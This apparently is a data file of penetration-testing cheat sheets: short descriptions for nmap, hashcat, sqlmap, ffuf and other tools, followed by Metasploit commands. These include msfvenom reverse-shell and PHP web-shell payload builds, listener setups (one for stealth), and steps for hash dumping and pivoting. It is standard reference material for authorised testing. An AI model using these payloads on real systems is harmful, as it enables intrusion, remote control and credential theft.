cheatsheets.title: Nmap Cheat Sheet
cheatsheets.description: Essential nmap commands for network discovery, port scanning, service enumeration, and firewall evasion. Covers everything from basic host discovery to advanced NSE scripting.

cheatsheets.title: Hashcat Cheat Sheet
cheatsheets.description: GPU-accelerated password cracking with hashcat. Covers attack modes, hash type identifiers, rule-based mutations, mask attacks, and session management for long-running jobs.

cheatsheets.title: SQLMap Cheat Sheet
cheatsheets.description: Automated SQL injection detection and exploitation with sqlmap. From basic URL testing through database enumeration, OS-level access, and WAF bypass techniques.

cheatsheets.title: ffuf Cheat Sheet
cheatsheets.description: Fast web fuzzer for directory discovery, virtual host enumeration, and parameter brute-forcing. Covers filtering, matching, recursion, and integration with wordlists.

cheatsheets.title: Nuclei Cheat Sheet
cheatsheets.description: Template-based vulnerability scanner for fast, configurable security checks. Covers template selection, severity filtering, rate limiting, output formatting, and workflow orchestration.

commands.description: Pipe critical CVE findings to notification tool

cheatsheets.title: Subfinder Cheat Sheet
cheatsheets.description: Passive subdomain discovery tool that aggregates results from dozens of sources. Fast, configurable, and designed to integrate with the ProjectDiscovery toolchain.

cheatsheets.title: Metasploit Cheat Sheet
cheatsheets.description: The Metasploit Framework for penetration testing, exploit development, and post-exploitation. Covers msfconsole navigation, payload generation, exploit usage, and post-exploitation modules.

commands.description: Start Metasploit console in quiet mode without the banner
Search for Windows SMB exploits in the module database
Find excellent-ranked exploits by CVE year
Select the multi-handler module for catching reverse shells
Display detailed information about a specific module

commands.command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
commands.description: Generate a Windows 64-bit Meterpreter reverse TCP executable

commands.command: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
commands.description: Generate a Linux reverse shell ELF binary

commands.command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe -e x64/xor_dynamic -i 5 -o payload.exe
commands.description: Generate encoded HTTPS Meterpreter with 5 encoding iterations

commands.command: msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.php
commands.description: Generate a PHP Meterpreter web shell
List all available Meterpreter payload variants
Configure target hosts, port, and execute the selected exploit

commands.command:
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
commands.description: Configure payload with callback address and port
Check if the target is vulnerable without exploiting it
Run the exploit as a background job
List all active sessions (shells and meterpreter)
Interact with session ID 1
Suggest local privilege escalation exploits for the target
Dump password hashes from a compromised Windows host
Add a route through a compromised host for pivoting
Enumerate currently and recently logged-on users

commands.command:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
commands.description: Set up a background listener for reverse TCP Meterpreter

commands.command:
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
commands.description: Start a SOCKS proxy server for pivoting through sessions

commands.command:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set HandlerSSLCert cert.pem
exploit -j
commands.description: HTTPS listener with custom SSL certificate for stealth
